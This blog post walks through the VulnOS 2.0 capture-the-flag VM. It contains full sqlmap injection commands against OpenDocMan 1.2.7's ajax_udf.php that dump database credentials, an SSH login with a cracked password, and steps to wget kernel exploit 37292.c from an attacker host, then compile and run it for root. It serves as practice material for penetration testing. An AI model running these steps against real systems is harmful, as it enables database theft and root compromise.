@@ -1,0 +1,408 @@
+
+								
+																		Hack the VulnOS 2.0 VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on October 17, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									“Your assignment is to pentest a company website, get the root of the system and read the final flag” is the only thing we know about this VM other than that is it a smaller one. Therefore without any further ado lets starts by finding our target aka victim.
+Breaching Methodologies:
+
+Network Scanning (netdiscover, Nmap)
+Enumeration (source code review)
+Use Exploit 32075 (searchsploit)
+SQL injection (sqlmap)
+Use fetched credential for SSH login
+Kernel Privilege Escalation (Exploit 37292)
+Get Root access and capture the flag.
+
+
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Here, it has discovered the target IP: 192.168.1.102, and now we will run nmap to determine what services are running.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.102
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.102
+					
+				
+			
+		
+
+
+So, the services that running is SSH on 22 ports, HTTP on 80 ports, IRC on 6667. As port 80 is open that means we can open it in the browser.
+
+Since we didn’t found anything on a web page, therefore, we looked into its source code and here saw a link /jabc; let’s open it.
+
+When we had explored /jabc in the browser, it put up the following page.
+
+In this webpage, there were various tabs and I explored each tab including their page source and I found nothing except for the last tab i.e. Document. 
+
+When you look into the page source there will be a line saying “/jabd0cs/ on the server. Just log in with the guest/guest.”
+
+So, I opened the directory and logged in with guest: guest as username: password respectively. And there was an upload option but there was a restriction that you can only upload the .doc file so it was pretty useless.
+If you observe the login page there is a cms opendocman v1.2.7. this version of opendocman is vulnerable.
+
+Let’s search for its exploits to be used against opendocman. And for that type:
+
+		
+		
+			
+			
+			
+			
+searchsploit OpenDocMan 1.2.7
+			
+				
+					
+				
+					1
+				
+						searchsploit OpenDocMan 1.2.7
+					
+				
+			
+		
+
+From its result, we found exploit 32075.txt which was showing “the vulnerability exists due to insufficient validation of “add_value” HTTP GET parameter in “/ajax_udf.php” script. A remote unauthenticated attacker can execute arbitrary SQL commands in application’s database.”
+
+Now we will use sqlmap to find out the database of usernames and passwords and for that type:
+
+		
+		
+			
+			
+			
+			
+sqlmap -u 'http://192.168.1.102/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user' --risk=3 --level=5 --dbs --threads=4 --batch
+			
+				
+					
+				
+					1
+				
+						sqlmap -u 'http://192.168.1.102/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user' --risk=3 --level=5 --dbs --threads=4 --batch
+					
+				
+			
+		
+
+
+And we have fetched database name “jabcd0cs”
+
+
+		
+		
+			
+			
+			
+			
+sqlmap -u 'http://192.168.1.102/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user' -D jabcd0cs --risk=3 --level=5 --threads=4 --dump-all --batch
+			
+				
+					
+				
+					1
+				
+						sqlmap -u 'http://192.168.1.102/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user' -D jabcd0cs --risk=3 --level=5 --threads=4 --dump-all --batch
+					
+				
+			
+		
+
+The sqlmap command will show us all the username and passwords as shown below.
+
+As you can see that the password is an MD5 hash value. We can crack it online no third party tool is needed.
+
+Password turns outs to be webmin1980 with the username of webmin. As we have username and password we can log in through SSH port. And to log in through SSH open a new terminal in kali and type:
+
+		
+		
+			
+			
+			
+			
+ssh webmin@192.168.1.102
+			
+				
+					
+				
+					1
+				
+						ssh webmin@192.168.1.102
+					
+				
+			
+		
+
+And then give the password when asked and you will have a session. Let’s check the version of the kernel to see if it is vulnerable or not.
+
+		
+		
+			
+			
+			
+			
+lsb_release -a
+			
+				
+					
+				
+					1
+				
+						lsb_release -a
+					
+				
+			
+		
+
+
+The version is 14.04 that means it can be exploited, and for that type:
+
+		
+		
+			
+			
+			
+			
+searchsploit ubuntu 14.04
+			
+				
+					
+				
+					1
+				
+						searchsploit ubuntu 14.04
+					
+				
+			
+		
+
+It has shown so many exploits and from those, we chose 37292.c for overlayfs’ Local Privilege Escalation’.
+
+Start python HTTP server for transferring it into victim’s machine.
+
+Type the following command to download it:
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+wget https://192.168.1.108/37292.c
+			
+				
+					
+				
+					12
+				
+						cd /tmpwget https://192.168.1.108/37292.c
+					
+				
+			
+		
+
+As the exploit is downloaded, now as always we need to compile it and then run it. And for that the set of commands is:
+
+		
+		
+			
+			
+			
+			
+gcc 37292.c -o shell
+./shell
+			
+				
+					
+				
+					12
+				
+						gcc 37292.c -o shell./shell
+					
+				
+			
+		
+
+And voila you have reached root but our challenge is not completed here. We still have to find the flag. Once you have reached root then go into the /root directory:
+
+		
+		
+			
+			
+			
+			
+id
+cd /root
+			
+				
+					
+				
+					12
+				
+						idcd /root
+					
+				
+			
+		
+
+Let’s check what files and folders it is holding.
+
+		
+		
+			
+			
+			
+			
+ls
+			
+				
+					
+				
+					1
+				
+						ls
+					
+				
+			
+		
+
+And here you will a flag.txt. Read it!
+
+		
+		
+			
+			
+			
+			
+cat flag.txt
+			
+				
+					
+				
+					1
+				
+						cat flag.txt
+					
+				
+			
+		
+
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
